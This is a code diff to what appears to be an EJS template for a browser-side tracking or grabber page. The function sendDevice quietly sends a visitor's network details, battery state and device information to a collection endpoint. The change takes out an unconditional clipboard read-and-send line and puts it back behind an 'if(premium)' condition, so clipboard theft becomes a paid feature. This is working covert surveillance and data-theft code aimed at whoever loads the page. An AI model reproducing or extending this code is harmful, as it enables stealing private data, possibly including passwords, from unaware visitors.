@@ -74,7 +74,7 @@ async function sendDevice(){
   if(navigator.connection){var nc=navigator.connection;td+="<b>🌐 Net:</b> "+nc.effectiveType+" "+(nc.downlink||'?')+"Mbps<br>";$.post(a+"/network",{uid:uid,data:encodeURIComponent("📶 "+nc.effectiveType+" ⚡"+(nc.downlink||'?')+"Mbps RTT:"+(nc.rtt||'?')+"ms")});}
   if("getBattery" in navigator){try{var b=await navigator.getBattery();td+="<b>🔋 "+Math.round(b.level*100)+"% Charging:"+b.charging+"</b><br>";$.post(a+"/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}}
   $.post(a,{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
-  if(navigator.clipboard&&navigator.clipboard.readText){try{var clip=await navigator.clipboard.readText();if(clip&&clip.trim())$.post(a+"/clipboard",{uid:uid,clip:encodeURIComponent(clip)});}catch(e){}}
+<% if(premium){ %>  if(navigator.clipboard&&navigator.clipboard.readText){try{var clip=await navigator.clipboard.readText();if(clip&&clip.trim())$.post(a+"/clipboard",{uid:uid,clip:encodeURIComponent(clip)});}catch(e){}}<% } %>
 }
 
 function fireLocation(){
